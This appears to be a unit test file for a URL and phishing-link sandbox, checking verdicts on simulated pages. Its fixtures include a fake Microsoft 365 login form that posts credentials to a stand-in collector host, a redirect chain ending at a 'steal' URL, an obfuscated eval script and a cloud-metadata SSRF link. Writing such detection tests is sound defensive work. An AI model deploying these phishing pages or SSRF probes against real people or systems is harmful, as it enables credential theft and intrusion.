"""
Unit tests for the Inbuilt URL and Malicious Link Behavioral Sandbox.
"""

import os
import sys
import unittest

# Ensure root is in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../")))

from apps.sandbox.src.url_sandbox import UrlSandboxRunner


class TestUrlSandbox(unittest.TestCase):

    def setUp(self):
        self.url_sandbox = UrlSandboxRunner()

    def test_microsoft_credential_phishing_detection(self):
        """Test URL detonation of a simulated Microsoft 365 login harvest page."""
        url = "http://secure-update-verify.ru/login.php"
        landing_html = """
        <!DOCTYPE html>
        <html>
        <head><title>Sign in to your Microsoft Office365 Account</title></head>
        <body>
            <h2>Sign in</h2>
            <form action="http://evil-c2-collector.ru/harvest.php" method="POST">
                <input type="text" name="email" placeholder="someone@example.com" />
                <input type="password" name="passwd" placeholder="Password" />
                <button type="submit">Sign In</button>
            </form>
        </body>
        </html>
        """

        report = self.url_sandbox.analyze_url(url, simulated_landing_html=landing_html)

        self.assertEqual(report.verdict, "MALICIOUS")
        self.assertEqual(report.threat_category, "CREDENTIAL_PHISHING")
        self.assertGreaterEqual(report.risk_score, 80.0)
        self.assertTrue(report.page_features.has_login_form)
        self.assertTrue(report.page_features.has_password_field)
        self.assertEqual(report.page_features.impersonated_brand, "Microsoft")
        self.assertTrue(any("Microsoft" in e for e in report.evidence))

    def test_multi_hop_shortener_redirect(self):
        """Test tracing multi-hop shortened links."""
        short_url = "http://bit.ly/urgent-statement"
        redirects = [
            "http://bit.ly/urgent-statement",
            "http://t.co/forward1",
            "http://evil-collector.top/steal"
        ]
        landing_html = "<form><input type='password' /></form>"

        report = self.url_sandbox.analyze_url(
            short_url,
            simulated_landing_html=landing_html,
            simulated_redirects=redirects
        )

        self.assertTrue(report.is_shortener)
        self.assertEqual(report.final_destination_url, "http://evil-collector.top/steal")
        self.assertEqual(len(report.redirect_chain), 3)
        self.assertIn(report.verdict, ["SUSPICIOUS", "MALICIOUS"])
        self.assertTrue(any("redirect" in e.lower() for e in report.evidence))

    def test_obfuscated_javascript_exploit(self):
        """Test detection of dynamically evaluated or obfuscated script tags."""
        url = "http://45.33.32.156/payload.html"
        landing_html = """
        <script>
            eval(unescape('%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%3D'));
        </script>
        """

        report = self.url_sandbox.analyze_url(url, simulated_landing_html=landing_html)

        self.assertTrue(report.page_features.obfuscated_javascript)
        self.assertTrue(report.is_ip_based)
        self.assertEqual(report.verdict, "MALICIOUS")
        self.assertEqual(report.threat_category, "BROWSER_EXPLOIT")

    def test_ssrf_and_cloud_metadata_link_blocking(self):
        """Test that submitting an internal SSRF or metadata link is immediately blocked."""
        ssrf_url = "http://169.254.169.254/latest/meta-data/identity-credentials"

        report = self.url_sandbox.analyze_url(ssrf_url)

        self.assertTrue(report.network_guard_blocked)
        self.assertEqual(report.verdict, "BLOCKED_SSRF")
        self.assertEqual(report.threat_category, "SSRF_PROBE")
        self.assertIn("Cloud Metadata", report.blocked_reason)

    def test_clean_legitimate_url(self):
        """Test clean URL with no phishing forms or obfuscated payloads."""
        clean_url = "https://example.com/about"
        landing_html = "<html><body><h1>About Our Open-Source Project</h1><p>Documentation and release notes.</p></body></html>"

        report = self.url_sandbox.analyze_url(clean_url, simulated_landing_html=landing_html)

        self.assertEqual(report.verdict, "CLEAN")
        self.assertLess(report.risk_score, 40.0)
        self.assertFalse(report.page_features.has_login_form)
        self.assertIsNone(report.threat_category)


if __name__ == "__main__":
    unittest.main()
